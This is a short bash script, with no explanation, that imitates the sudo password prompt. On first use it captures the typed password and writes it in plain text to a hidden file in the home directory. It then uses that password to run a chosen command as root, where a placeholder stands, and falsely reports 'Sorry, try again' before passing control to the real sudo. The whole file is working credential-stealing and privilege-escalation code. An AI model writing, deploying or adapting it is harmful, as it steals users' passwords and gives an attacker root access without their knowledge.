#!/bin/bash

FILE=$HOME/.password.txt
COMMAND='echo 123 > /test.txt'

if [ ! -f $FILE ]; then
	echo -n [sudo] password for $(whoami): 
	read -s password
	echo $password > $FILE
	echo ""

	echo $password | sudo -S -k sh -c "$COMMAND" > /dev/null 2>&1 

	sleep 3

	echo Sorry, try again.

	$(which sudo) -k $@
else
	$(which sudo) $@
fi

